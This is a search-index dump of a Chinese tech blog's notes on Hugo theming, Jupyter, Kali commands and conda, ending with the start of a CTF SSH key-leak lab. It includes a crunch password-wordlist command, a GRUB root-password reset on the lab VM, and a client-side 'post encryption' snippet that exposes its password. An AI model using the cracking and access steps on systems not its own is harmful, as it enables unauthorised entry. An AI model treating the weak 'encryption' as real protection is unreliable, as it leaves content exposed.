src=\"https://cdn.jsdelivr.net/npm/jquery@2.1.3/dist/jquery.min.js\"\u003e\u003c/script\u003e \u003cscript type=\"text/javascript\" src=\"https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js\"\u003e\u003c/script\u003e static\\js\\custom.js /* 轮播背景图片 */ $(function () { $.backstretch([ \"/images/background/saber1.jpg\", \"/images/background/saber2.jpg\", \"/images/background/wlop.jpg\" ], { duration: 60000, fade: 1500 }); }); assets\\css\\_custom.scss 包含对各页面的调整 /* 首页头部 */ .home[posts] .home-profile { padding-top: 0; } .home-avatar { padding-top: 2rem !important; } .home-profile { margin-left: -1rem; margin-right: -1rem; background: white; opacity: .85; } [theme=dark] .home-profile { background: #3a3535; opacity: .8; } .home .home-profile .home-title { margin-top: .67em; } /* 首页文章摘要 */ .summary { margin-bottom: .1rem; margin-left: -1rem; margin-right: -1rem; padding-left: 1rem; padding-right: 1rem; background: white; opacity: .95; } [theme=dark] .summary { background: #3a3535; } /* 首页的分页页码 */ .pagination { margin-top: .1rem; margin-bottom: 0; margin-left: -1rem; margin-right: 1rem; padding: 1rem 2rem .5rem 0; background: white; opacity: .95; } [theme=dark] .pagination { background: #3a3535; } /* 首页的阅读全文按钮 */ .single.summary .post-footer a:first-child { position: relative; z-index: 1; \u0026::before { content: ''; position: absolute; z-index: -1; top: 0; bottom: 0; left: -0.25em; right: -0.25em; background-color: hsla(341, 66%, 74%, 0.75); transform-origin: center right; transform: scaleX(0); transition: transform 0.2s ease-in-out; } \u0026:hover::before { transform: scaleX(1); transform-origin: center left; } } /* 文章正文 */ .page.single .content p { margin: 1rem 0; padding: 0 1rem; } /* 文章脚部 */ .page.single .post-footer { margin-top: 0; margin-bottom: 1rem; } /* 文章元数据meta */ .post-meta .post-meta-line:nth-child(2) i:nth-child(1) { margin-left: 0; } .post-meta .post-meta-line:nth-child(2) i { margin-left: 0.3rem; } .post-meta .post-meta-line:nth-child(2) span i { margin-left: 0.3rem !important; } .post-meta a#post-meta-vcount { color: #a9a9b3; \u0026:hover { color: #2d96bd; } } /* 文章的标签 */ .post-tags a { position: relative; \u0026::before, \u0026::after { content: ''; position: absolute; left: 0; right: 0; height: 2px; background-color: #fc2f70; transform: scaleX(0); transition: transform 0.5s ease; } \u0026::before { top: 0; transform-origin: center right; } \u0026:hover::before { transform-origin: center left; transform: scaleX(1); } \u0026::after { bottom: 0; transform-origin: center left; } \u0026:hover::after { transform-origin: center right; transform: scaleX(1); } } /* 页面脚部 */ .footer { display: block; border-top-width: 3px; border-top-style: solid; border-top-color: #a166ab; position: relative; z-index: -1; max-width: 800px; width: 60%; margin: .1rem auto 0 auto; padding-left: 1rem; padding-right: 1rem; background: white; opacity: .95; } [theme=dark] .footer { background: #3a3535; } @media only screen and (max-width: 1440px) { .footer { width: 54.5% } } @media only screen and (max-width: 1200px) { .footer { width: 50.5% } } @media only screen and (max-width: 960px) { .footer { width: 77% } } @media only screen and (max-width: 680px) { .footer { width: 95% } } /* 分隔线 */ hr { border: none; border-bottom: 2px dashed #7a7a7a !important; } /* 标题 */ .page.single h2 { box-shadow: rgb(95, 90, 75) 0px 0px 0px 1px, rgba(10, 10, 0, 0.5) 1px 1px 6px 1px; color: rgb(255, 255, 255); font-family: 微软雅黑, 宋体, 黑体, Arial; font-weight: bold; line-height: 1.3; text-shadow: rgb(34, 34, 34) 2px 2px 3px; background: rgb(43, 102, 149); border-radius: 6px; border-width: initial; border-style: none; border-color: initial; border-image: initial; padding: 7px; margin: 18px 0px 18px -5px !important; } /* 归档、标签、分类、特殊页面 */ .page.archive, .page.single, .page.single.special { padding-left: 1rem; padding-right: 1rem; padding-bottom: 1rem; background: white; opacity: .95; } [theme=dark] .page.ar","date":"2022-11-16","objectID":"/hugo%E9%85%8D%E7%BD%AE/:1:7","tags":["blog","hugo","LoveIt"],"title":"Hugo配置","uri":"/hugo%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":"文章加密 layouts\\posts\\single.html 在{{- $params := .Scratch.Get \"params\" -}}的下一行添加 {{- $password := $params.password | default \"\" -}} {{- if ne $password \"\" -}} \u003cscript\u003e (function(){ if({{ $password }}){ if (prompt('请输入文章密码') != {{ $password }}){ alert('密码错误！'); if (history.length === 1) { window.opener = null; window.open('', '_self'); window.close(); } else { history.back(); } } } })(); \u003c/script\u003e {{- end -}} 文章头部加上password属性即可加密 ","date":"2022-11-16","objectID":"/hugo%E9%85%8D%E7%BD%AE/:1:8","tags":["blog","hugo","LoveIt"],"title":"Hugo配置","uri":"/hugo%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":"拉姆雷姆跳转 layouts_default\\baseof.html 在{{- /* Load JavaScript scripts and CSS */ -}}的上面一行添加 \u003cdiv class=\"sidebar_wo\"\u003e \u003cdiv id=\"leimu\"\u003e \u003cimg src=\"https://cdn.jsdelivr.net/gh/lewky/lewky.github.io@master/images/b2t/leimuA.png\" alt=\"雷姆\" onmouseover=\"this.src='https://cdn.jsdelivr.net/gh/lewky/lewky.github.io@master/images/b2t/leimuB.png'\" onmouseout=\"this.src='https://cdn.jsdelivr.net/gh/lewky/lewky.github.io@master/images/b2t/leimuA.png'\" title=\"回到顶部\"\u003e \u003c/div\u003e \u003cdiv class=\"sidebar_wo\" id=\"lamu\"\u003e \u003cimg src=\"https://cdn.jsdelivr.net/gh/lewky/lewky.github.io@master/images/b2t/lamuA.png\" alt=\"雷姆\" onmouseover=\"this.src='https://cdn.jsdelivr.net/gh/lewky/lewky.github.io@master/images/b2t/lamuB.png'\" onmouseout=\"this.src='https://cdn.jsdelivr.net/gh/lewky/lewky.github.io@master/images/b2t/lamuA.png'\" title=\"回到底部\"\u003e \u003c/div\u003e \u003c/div\u003e assets\\css\\_custom.scss \u003cdiv class=\"sidebar_wo\"\u003e \u003cdiv id=\"leimu\"\u003e \u003cimg src=\"https://cdn.jsdelivr.net/gh/lewky/lewky.github.io@master/images/b2t/leimuA.png\" alt=\"雷姆\" onmouseover=\"this.src='https://cdn.jsdelivr.net/gh/lewky/lewky.github.io@master/images/b2t/leimuB.png'\" onmouseout=\"this.src='https://cdn.jsdelivr.net/gh/lewky/lewky.github.io@master/images/b2t/leimuA.png'\" title=\"回到顶部\"\u003e \u003c/div\u003e \u003cdiv class=\"sidebar_wo\" id=\"lamu\"\u003e \u003cimg src=\"https://cdn.jsdelivr.net/gh/lewky/lewky.github.io@master/images/b2t/lamuA.png\" alt=\"雷姆\" onmouseover=\"this.src='https://cdn.jsdelivr.net/gh/lewky/lewky.github.io@master/images/b2t/lamuB.png'\" onmouseout=\"this.src='https://cdn.jsdelivr.net/gh/lewky/lewky.github.io@master/images/b2t/lamuA.png'\" title=\"回到底部\"\u003e \u003c/div\u003e \u003c/div\u003e static\\js\\custom.js 需引入jQuery /* 拉姆蕾姆回到顶部或底部按钮 */ $(function() { $(\"#lamu img\").eq(0).click(function() { $(\"html,body\").animate({scrollTop:$(document).height()},800); return false; }); $(\"#leimu img\").eq(0).click(function() { $(\"html,body\").animate({scrollTop:0},800); return false; }); }); ","date":"2022-11-16","objectID":"/hugo%E9%85%8D%E7%BD%AE/:1:9","tags":["blog","hugo","LoveIt"],"title":"Hugo配置","uri":"/hugo%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":"添加文章数量统计 layouts\\taxonomy\\list.html {{- if eq $taxonomy \"category\" -}} \u003ci class=\"far fa-folder-open fa-fw\"\u003e\u003c/i\u003e\u0026nbsp;{{ .Title }} {{- else if eq $taxonomy \"tag\" -}} \u003ci class=\"fas fa-tag fa-fw\"\u003e\u003c/i\u003e\u0026nbsp;{{ .Title }} {{- else -}} 改为： {{- if eq $taxonomy \"category\" -}} \u003ci class=\"far fa-folder-open fa-fw\"\u003e\u003c/i\u003e\u0026nbsp;{{ .Title }}\u003csup\u003e{{ len .Pages }}\u003c/sup\u003e {{- else if eq $taxonomy \"tag\" -}} \u003ci class=\"fas fa-tag fa-fw\"\u003e\u003c/i\u003e\u0026nbsp;{{ .Title }}\u003csup\u003e{{ len .Pages }}\u003c/sup\u003e {{- else -}} {{- range $pages.PageGroups -}} \u003ch3 class=\"group-title\"\u003e{{ .Key }}\u003c/h3\u003e 改为： {{- range $pages.PageGroups -}} \u003ch3 class=\"group-title\"\u003e{{ .Key }} \u003csup\u003e{{ len .Pages }}\u003c/sup\u003e\u003c/h3\u003e 改为按月份分组 {{- /* Paginate */ -}} {{- if .Pages -}} {{- $pages := .Pages.GroupByDate \"2006\" -}} 改为： {{- /* Paginate */ -}} {{- if .Pages -}} {{- $pages := .Pages.GroupByDate \"2006-01\" -}} layouts\\taxonomy\\terms.html \u003cdiv class=\"page archive\"\u003e {{- /* Title */ -}} \u003ch2 class=\"single-title animated pulse faster\"\u003e {{- .Params.Title | default (T $taxonomies) | default $taxonomies | dict \"Some\" | T \"allSome\" -}} \u003c/h2\u003e 改为： \u003cdiv class=\"page archive\"\u003e {{- /* Title */ -}} \u003ch2 class=\"single-title animated pulse faster\"\u003e {{- .Params.Title | default (T $taxonomies) | default $taxonomies | dict \"Some\" | T \"allSome\" -}}\u003csup\u003e{{ len .Pages }}\u003c/sup\u003e \u003c/h2\u003e \u003ch3 class=\"card-item-title\"\u003e \u003ca href=\"{{ .RelPermalink }}\"\u003e \u003ci class=\"far fa-folder fa-fw\"\u003e\u003c/i\u003e\u0026nbsp;{{ .Page.Title }} \u003c/a\u003e \u003c/h3\u003e 改为： \u003ch3 class=\"card-item-title\"\u003e \u003ca href=\"{{ .RelPermalink }}\"\u003e \u003ci class=\"far fa-folder fa-fw\"\u003e\u003c/i\u003e\u0026nbsp;{{ .Page.Title }} \u003csup\u003e{{ len .Pages }}\u003c/sup\u003e \u003c/a\u003e \u003c/h3\u003e layouts_default\\section.html \u003cdiv class=\"page archive\"\u003e {{- /* Title */ -}} \u003ch2 class=\"single-title animated pulse faster\"\u003e {{- .Params.Title | default (T .Section) | default .Section | dict \"Some\" | T \"allSome\" -}} \u003c/h2\u003e 改为： \u003cdiv class=\"page archive\"\u003e {{- /* Title */ -}} \u003ch2 class=\"single-title animated pulse faster\"\u003e {{- .Params.Title | default (T .Section) | default .Section | dict \"Some\" | T \"allSome\" -}}\u003csup\u003e{{ len .Pages }}\u003c/sup\u003e \u003c/h2\u003e {{- range $pages.PageGroups -}} \u003ch3 class=\"group-title\"\u003e{{ .Key }}\u003c/h3\u003e 改为： {{- range $pages.PageGroups -}} \u003ch3 class=\"group-title\"\u003e{{ .Key }} \u003csup\u003e{{ len .Pages }}\u003c/sup\u003e\u003c/h3\u003e 按月份分组 {{- /* Paginate */ -}} {{- if .Pages -}} {{- $pages := .Pages.GroupByDate \"2006\" -}} 改为： {{- /* Paginate */ -}} {{- if .Pages -}} {{- $pages := .Pages.GroupByDate \"2006-01\" -}} ","date":"2022-11-16","objectID":"/hugo%E9%85%8D%E7%BD%AE/:1:10","tags":["blog","hugo","LoveIt"],"title":"Hugo配置","uri":"/hugo%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":"站点运行时间 layouts\\partials\\footer.html 在\u003cdiv class=\"footer-container\"\u003e的下方添加 \u003cdiv class=\"footer-line\"\u003e \u003cspan id=\"run-time\"\u003e\u003c/span\u003e \u003c/div\u003e static\\js\\custom.js /* 站点运行时间 */ function runtime() { window.setTimeout(\"runtime()\", 1000); /* 请修改这里的起始时间 */ let startTime = new Date('12/1/2021 15:00:00'); let endTime = new Date(); let usedTime = endTime - startTime; let days = Math.floor(usedTime / (24 * 3600 * 1000)); let leavel = usedTime % (24 * 3600 * 1000); let hours = Math.floor(leavel / (3600 * 1000)); let leavel2 = leavel % (3600 * 1000); let minutes = Math.floor(leavel2 / (60 * 1000)); let leavel3 = leavel2 % (60 * 1000); let seconds = Math.floor(leavel3 / (1000)); let runbox = document.getElementById('run-time'); runbox.innerHTML = '本站已运行\u003ci class=\"far fa-clock fa-fw\"\u003e\u003c/i\u003e ' + ((days \u003c 10) ? '0' : '') + days + ' 天 ' + ((hours \u003c 10) ? '0' : '') + hours + ' 时 ' + ((minutes \u003c 10) ? '0' : '') + minutes + ' 分 ' + ((seconds \u003c 10) ? '0' : '') + seconds + ' 秒 '; } runtime(); ","date":"2022-11-16","objectID":"/hugo%E9%85%8D%E7%BD%AE/:1:11","tags":["blog","hugo","LoveIt"],"title":"Hugo配置","uri":"/hugo%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":"其他 assets\\css\\_custom.scss /* 滚动条 */ ::-webkit-scrollbar { width: 0.7rem; } /* 右下角按钮 */ .fixed-button { margin-bottom: 5rem; } /* 图片 */ figcaption { display: none !important; } img[data-sizes=\"auto\"] { display: block; /* width: 50%;*/ } static/js/custom.js /* 离开当前页面时修改网页标题，回到当前页面时恢复原来标题 */ window.onload = function() { var OriginTitile = document.title; var titleTime; document.addEventListener('visibilitychange', function() { if(document.hidden) { $('[rel=\"icon\"]').attr('href', \"/images/w.ico\"); $('[rel=\"shortcut icon\"]').attr('href', \"/images/w.ico\"); document.title = '喔唷，崩溃啦！'; clearTimeout(titleTime); } else { $('[rel=\"icon\"]').attr('href', \"/images/w.ico\"); $('[rel=\"shortcut icon\"]').attr('href', \"/images/w.ico\"); document.title = '咦，页面又好了！'; titleTime = setTimeout(function() { document.title = OriginTitile; }, 2000); } }); } ","date":"2022-11-16","objectID":"/hugo%E9%85%8D%E7%BD%AE/:1:12","tags":["blog","hugo","LoveIt"],"title":"Hugo配置","uri":"/hugo%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":"shortcode ","date":"2022-11-16","objectID":"/hugo%E9%85%8D%E7%BD%AE/:2:0","tags":["blog","hugo","LoveIt"],"title":"Hugo配置","uri":"/hugo%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":"typeit ","date":"2022-11-16","objectID":"/hugo%E9%85%8D%E7%BD%AE/:2:1","tags":["blog","hugo","LoveIt"],"title":"Hugo配置","uri":"/hugo%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":"bilibili layouts/shortcodes/bilibili.html \u003cstyle\u003e .aspect-ratio { position: relative; width: 100%; height: 0; padding-bottom: 75%; } .aspect-ratio iframe { position: absolute; width: 100%; height: 100%; left: 0; top: 0; } \u003c/style\u003e \u003cdiv align=center class=\"aspect-ratio\"\u003e \u003ciframe src=\"https://player.bilibili.com/player.html?bvid={{.Get 0 }}\u0026page={{ if .Get 1 }}{{.Get 1}}{{ else }}1\u0026high_quality=1\u0026danmaku=0{{end}}\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\" sandbox=\"allow-top-navigation allow-same-origin allow-forms allow-scripts\"\u003e \u003c/iframe\u003e \u003c/div\u003e 存在问题：切换清晰度后无法播放 ","date":"2022-11-16","objectID":"/hugo%E9%85%8D%E7%BD%AE/:2:2","tags":["blog","hugo","LoveIt"],"title":"Hugo配置","uri":"/hugo%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":"music 参数： server [netease, tencent, kugou, xiami, baidu] type [song, playlist, album, search, artist] id ","date":"2022-11-16","objectID":"/hugo%E9%85%8D%E7%BD%AE/:2:3","tags":["blog","hugo","LoveIt"],"title":"Hugo配置","uri":"/hugo%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":"image 存在问题：缩放后无法居中 ","date":"2022-11-16","objectID":"/hugo%E9%85%8D%E7%BD%AE/:2:4","tags":["blog","hugo","LoveIt"],"title":"Hugo配置","uri":"/hugo%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":"admonition 注意 一个 注意 横幅 ","date":"2022-11-16","objectID":"/hugo%E9%85%8D%E7%BD%AE/:2:5","tags":["blog","hugo","LoveIt"],"title":"Hugo配置","uri":"/hugo%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":"其他 主题文档 - 扩展 Shortcodes - LoveIt (hugoloveit.com) ","date":"2022-11-16","objectID":"/hugo%E9%85%8D%E7%BD%AE/:2:6","tags":["blog","hugo","LoveIt"],"title":"Hugo配置","uri":"/hugo%E9%85%8D%E7%BD%AE/"},{"categories":["ECS"],"content":"Jupyter notebook 基于前面的阿里云ECS，创建jupyter 用Anaconda、miniconda安装，或pip安装，操作类似 直接用root用户安装会警告 解决方案：用普通用户；python的env虚拟环境；conda/mamba虚拟环境 c++内核xeus-cling必须用到conda，同时为了方便管理不同环境配置，采取mambaforge安装 ","date":"2022-11-16","objectID":"/jupyter/:1:0","tags":["ECS","jupyter"],"title":"Jupyter notebook","uri":"/jupyter/"},{"categories":["ECS"],"content":"mambaforge conda-forge/miniforge: A conda-forge distribution. (github.com) wget \"https://github.com/conda-forge/miniforge/releases/latest/download/Mambaforge-$(uname)-$(uname -m).sh\" # 选择对应版本 bash Mambaforge-$(uname)-$(uname -m).sh # 安装 vim ~/.bashrc # 环境变量 export PATH=\"/home/用户名/miniforge3/bin:$PATH\" source ~/.bashrc conda config --set auto_activate_base false # 不自动激活环境 mamba activate # 进入base虚拟环境 # 换源后安装 ","date":"2022-11-16","objectID":"/jupyter/:1:1","tags":["ECS","jupyter"],"title":"Jupyter notebook","uri":"/jupyter/"},{"categories":["ECS"],"content":"jupyter 安装 mamba install jupyter notebook 密码 python \u003e\u003e\u003e from notebook.auth import passwd \u003e\u003e\u003e passwd() \u003e\u003e\u003e exit() 输入密码，保存输出单引号内的内容 配置 jupyter notebook --generate-config cd ~/.jupyter vim jupyter_notebook_config.py 找到对应语句修改 c.NotebookApp.allow_origin = '*' c.NotebookApp.allow_remote_access = True c.NotebookApp.ip = '127.0.0.1' # 除非 IP 裸连否则不要改成 '*' c.NotebookApp.notebook_dir = '/home/用户名/projects' # jupyter项目存放位置 c.NotebookApp.password = 'xxxxxx' # 设置密码保存的内容 c.NotebookApp.open_browser = False # 服务器不打开浏览器 c.NotebookApp.port = 2333 # 端口 启动 jupyter notebook nohup jupyter notebook \u003e jupyter.log 2\u003e\u00261 \u0026 # 后台运行 域名加端口访问 报错 500 : Internal Server Error nbconvert版本不兼容 mamba install nbconvert==5.4.1 matplotlib 字体 (5条消息) SimHei字体（永久有效）_jlb1024的博客-CSDN博客_simhei字体官网 (5条消息) 解决Linux环境下Jupyter中matplotlib中文乱码问题_啊啊啊狗哥的博客-CSDN博客_jupyter matplotlib 中文 扩展插件 mamba install jupyter_contrib_nbextensions jupyter contrib nbextension install mamba install jupyter_nbextensions_configurator 启动后在浏览器就能看到插件目录 Hinterland 自动补全 主题样式 jupyter-themes mamba install jupyterthemes jt -l # 显示主题 jt [] # 设置 jt -r # 重置 样例 jt -t oceans16 -f fira -nf robotosans -tf robotosans -N -T -cellw 90% -fs 10 -nfs 12 -tfs 12 -dfs 10 -ofs -9 技巧 %%time 运行时间 shift+tab 打开函数说明文档 双击单元格左边 隐藏输出结果 内核 jupyter kernelspec list # 查看内核 jupyter kernelspec remove [内核名字] # 删除内核 python2 python2 -m pip install ipykernel python2 -m ipykernel install --name=kernelname --display-name showname C++ https://github.com/jupyter-xeus/xeus-cling https://xeus-cling.readthedocs.io/en/latest/installation.html#installing-the-kernel-spec mamba create -n cling source activate cling mamba install xeus-cling -c conda-forge jupyter kernelspec install mambaforge/envs/cling/share/jupyter/kernels/xcpp11 --sys-prefix jupyter kernelspec install mambaforge/envs/cling/share/jupyter/kernels/xcpp14 --sys-prefix jupyter kernelspec install mambaforge/envs/cling/share/jupyter/kernels/xcpp17 --sys-prefix 要在cling环境下启动jupyter才能正常使用 在同一个块包含两个头文件 会报内核重启错误，分块写就好了（不懂 ","date":"2022-11-16","objectID":"/jupyter/:1:2","tags":["ECS","jupyter"],"title":"Jupyter notebook","uri":"/jupyter/"},{"categories":["kali"],"content":"常见命令 whoami # 当前用户名 pwd # 显示当前目录 cd # 切换 ls -a # 显示目录及文件（包括隐藏） mkdir # 新建目录 rmdir -r # 删除目录 rm # 删除文件 cp [1] [2] # 复制1到2 mv [1] [2] # 重命名或移动文件 cat 1 # 查看1 cat 文件名 \u003e 输出文件名 // 合并 grep 'flag' file # 在file中搜索flag find . -name filename -print # 搜索文件 参考：linux基础命令V2.1 - 飞桨AI Studio (baidu.com) ","date":"2022-11-16","objectID":"/kali/:0:1","tags":["kali"],"title":"Kali","uri":"/kali/"},{"categories":["kali"],"content":"换源 sudo vim /etc/apt/sources.list # 阿里云 deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib # 中科大 deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib sudo apt-get dist-upgrade sudo apt-get update sudo apt-get upgrade ","date":"2022-11-16","objectID":"/kali/:0:2","tags":["kali"],"title":"Kali","uri":"/kali/"},{"categories":["kali"],"content":"gcc apt-get install gcc apt-get install gcc-multilib // 可以在64位机器上运行32位程序 ","date":"2022-11-16","objectID":"/kali/:0:3","tags":["kali"],"title":"Kali","uri":"/kali/"},{"categories":["kali"],"content":"python update-alternatives --config python // 切换python版本 // 或者直接使用python2或python3 ","date":"2022-11-16","objectID":"/kali/:0:4","tags":["kali"],"title":"Kali","uri":"/kali/"},{"categories":["kali"],"content":"vim 分为三种模式：命令模式、输入模式和底线命令模式 命令模式： i 切换到输入模式 x 删除当前光标所在字符 : 切换到底线命令模式 输入模式： HOME/END 移动到行首/行末 ESC 切换到命令模式 底线命令模式： :q 退出程序 :w 保存文件 :wq 保存并退出 参考：Kali下常用的Linux编辑器 - Kali’s Blog (bbskali.cn) 其他：简明 Vim 练级攻略 | 酷 壳 - CoolShell Linux 平台下阅读源码的工具 - 简书 (jianshu.com) 设置 vim .vimrc \"set tab to 4 set smarttab set tabstop=4 set shiftwidth=4 set expandtab \"set highlight syntax on set hlsearch ","date":"2022-11-16","objectID":"/kali/:0:5","tags":["kali"],"title":"Kali","uri":"/kali/"},{"categories":["kali"],"content":"gnuplot plot “文件名”/函数 // 绘制 ","date":"2022-11-16","objectID":"/kali/:0:6","tags":["kali"],"title":"Kali","uri":"/kali/"},{"categories":["kali"],"content":"ssh kali linux 开启ssh服务 - 哎哟，不错哦 - 博客园 (cnblogs.com) ","date":"2022-11-16","objectID":"/kali/:0:7","tags":["kali"],"title":"Kali","uri":"/kali/"},{"categories":["kali"],"content":"tar tar -zcvf out.tar.gz 原文件夹 # 压缩 tar -zxvf 1.tar.gz -C ./2/ # 解压 -c 生成档案文件，创建打包文件 -v 列出归档，解档的详细过程 -f 指定档案文件名称，f后一定是.tar文件 -x 解开档案文件 -z 调用gzip执行压缩功能 -C 大写C，解压到指定目录 ","date":"2022-11-16","objectID":"/kali/:0:8","tags":["kali"],"title":"Kali","uri":"/kali/"},{"categories":["kali"],"content":"7z 7za X 文件名 // 解压 ","date":"2022-11-16","objectID":"/kali/:0:9","tags":["kali"],"title":"Kali","uri":"/kali/"},{"categories":["kali"],"content":"crunch 字典生成 crunch \u003cmin-len\u003e \u003cmax-len\u003e [\u003ccharset string\u003e] [option] crunch 8 8 1234\"abcd\" -t pass%%%% \u003e\u003e out.txt # 8位，以pass开头，后面位1234abcd的组合 ","date":"2022-11-16","objectID":"/kali/:0:10","tags":["kali"],"title":"Kali","uri":"/kali/"},{"categories":["kali"],"content":"创建用户 创建 useradd [用户名] # 创建用户 passwd [用户名] # 设置密码 用户目录和启动 vim /etc/passwd 对应位置（末尾）修改 用户名❌1000:1000::/home/用户名:/bin/bash sudo权限 vim /etc/sudoers root用户类似语句下面增添，:wq! 退出保存 用户名 ALL=(ALL:ALL) ALL 命令高亮 vim /home/用户名/.bashrc 找到语句，取消注释（vim中/str搜索str force_color_prompt=yes 保存退出后 source /home/用户名/.bashrc 切换 su 用户名 ","date":"2022-11-16","objectID":"/kali/:0:11","tags":["kali"],"title":"Kali","uri":"/kali/"},{"categories":["kali"],"content":"环境变量 vim ~/.bashrc export PATH=\"yourpath:$PATH\" source ~/.bashrc ","date":"2022-11-16","objectID":"/kali/:0:12","tags":["kali"],"title":"Kali","uri":"/kali/"},{"categories":["kali"],"content":"报错 update报错 E: 仓库 “http://mirrors.163.com/debian wheezy Release” 没有 Release 文件。 N: 无法安全地用该源进行更新，所以默认禁用该源。 N: 参见 apt-secure(8) 手册以了解仓库创建和用户配置方面的细节。 cd /etc/apt/sources.list.d ls // docker.list rm docker.list // 清除该目录下文件 vim /etc/apt/sources.list // 如果还无法update，替换源 参考：kail升级报错：“E: 仓库 “https://download.docker.com/linux/debian kali-rolling Release” 没有 Release 文件。 - laolao - 博客园 (cnblogs.com) E: 仓库 “http://http.kali.org/kali kali-rolling InRelease” 没有数字签名。 N: 无法安全地用该源进行更新，所以默认禁用该源。 N: 参见 apt-secure(8) 手册以了解仓库创建和用户配置方面的细节。 wget archive.kali.org/archive-key.asc //下载签名 apt-key add archive-key.asc //安装签名 kali linux出现下列签名无效： EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository ＜devel@kali.org＞_隔壁山上小道士的博客-CSDN博客 ","date":"2022-11-16","objectID":"/kali/:0:13","tags":["kali"],"title":"Kali","uri":"/kali/"},{"categories":["python"],"content":"版本切换 ","date":"2022-11-16","objectID":"/python/:1:0","tags":["python"],"title":"Python","uri":"/python/"},{"categories":["python"],"content":"Windows 更改python目录下python.exe和pythonw.exe的名称 pip切换，python2 -m pip install –upgrade pip –force-reinstall 为python2安装pip2，pip3类似 ","date":"2022-11-16","objectID":"/python/:1:1","tags":["python"],"title":"Python","uri":"/python/"},{"categories":["python"],"content":"linux update-alternatives --config python # 切换python版本 # 或者直接使用python2或python3 ","date":"2022-11-16","objectID":"/python/:1:2","tags":["python"],"title":"Python","uri":"/python/"},{"categories":["python"],"content":"报错 TypeError: Unicode-objects must be encoded before hashing 在Unicode对象进行hash前要编码，加上.encode(‘utf-8’) ","date":"2022-11-16","objectID":"/python/:2:0","tags":["python"],"title":"Python","uri":"/python/"},{"categories":["python"],"content":"Anaconda miniconda、miniforge操作类似 ","date":"2022-11-16","objectID":"/python/:3:0","tags":["python"],"title":"Python","uri":"/python/"},{"categories":["python"],"content":"安装 Index of /anaconda/archive/ | 清华大学开源软件镜像站 | Tsinghua Open Source Mirror wget https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/Anaconda3-5.3.1-Linux-x86_64.sh # 下载 bash Anaconda3-5.3.1-Linux-x86_64.sh # 安装 vim ~/.bashrc # 添加环境变量 export PATH=/home/用户名/anaconda3/bin:$PATH source ~/.bashrc conda --version # 测试 ","date":"2022-11-16","objectID":"/python/:3:1","tags":["python"],"title":"Python","uri":"/python/"},{"categories":["python"],"content":"换源 anaconda | 镜像站使用帮助 | 清华大学开源软件镜像站 | Tsinghua Open Source Mirror 源：https://mdnice.com/writing/a8a3a65f87ec4835ace74cd356f1aa72 vim .condarc channels: - defaults show_channel_urls: true default_channels: - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/r - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/msys2 custom_channels: conda-forge: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud msys2: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud bioconda: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud menpo: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud pytorch: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud pytorch-lts: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud simpleitk: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud conda clean -i 报错https，就把链接改为http ","date":"2022-11-16","objectID":"/python/:3:2","tags":["python"],"title":"Python","uri":"/python/"},{"categories":["python"],"content":"创建 conda create -n [环境名] python= source activate [环境名] conda list # 查看安装包 conda install [安装包] conda env list # 查看虚拟环境 conda update conda # 更新 conda remove -n [环境名] [包名] # --all 删除环境 ","date":"2022-11-16","objectID":"/python/:3:3","tags":["python"],"title":"Python","uri":"/python/"},{"categories":["python"],"content":"卸载 rm -rf anaconda3 # 目录安装删除 rm .condarc # 删除配置文件 vim .bashrc # 删除环境变量 source .bashrc ","date":"2022-11-16","objectID":"/python/:3:4","tags":["python"],"title":"Python","uri":"/python/"},{"categories":["python"],"content":"报错 CondaSSLError: OpenSSL appears to be unavailable on this machine. OpenSSL is required to download and install packages. 安装openssl https://slproweb.com/products/Win32OpenSSL.html Windows powershell activate失败 conda install -n root -c pscondaenvs pscondaenvs # 管理员打开powershell运行 Set-ExecutionPolicy RemoteSigned conda config --set auto_activate_base False # 取消自动activate conda init # 重启terminal ","date":"2022-11-16","objectID":"/python/:3:5","tags":["python"],"title":"Python","uri":"/python/"},{"categories":["CTF"],"content":"参考：SSH私钥泄露 | wolke ","date":"2022-11-16","objectID":"/ssh%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2/:0:0","tags":["CTF","ssh"],"title":"ssh私钥泄露","uri":"/ssh%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2/"},{"categories":["CTF"],"content":"一、靶机 1、下载安装 链接 打开方式为VMware Workstation，主机和靶机网络适配器设为相同模式，我的是NAT，有些网络下桥接显示不了IP（宿舍校园网无线和有线显示不了，教学区校园网ip显示不同，不懂 参考：CTF靶场系列————SSH-私钥泄露 | m0re的小站 2、准备 靶机开启就行，不需要登入，这一步看情况进行 （1）重置靶场密码 重启主机，按e，进入如下界面 找到linux开头一行，末尾添加init=/bin/bash，按Crtl+x完成输入 mount -o rw,remount / passwd root // 重置密码 成功后重启虚拟机，以root用户进入 （2）查看IP 输入ip a，查看靶机IP地址 192.168.130.130 